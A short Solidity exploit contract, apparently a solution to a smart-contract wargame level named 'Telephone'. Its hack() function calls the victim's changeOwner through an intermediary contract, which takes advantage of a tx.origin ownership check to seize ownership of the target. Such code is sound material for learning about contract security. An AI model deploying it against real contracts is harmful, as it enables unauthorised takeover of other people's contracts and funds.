// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface Telephone {
  function changeOwner(address _owner) external ;
}

contract EXP{
    Telephone victim;
    constructor(address _addr) public {
        victim = Telephone(_addr);
    }

    function hack(address _owner_addr) public {
        victim.changeOwner(_owner_addr);
    }
}
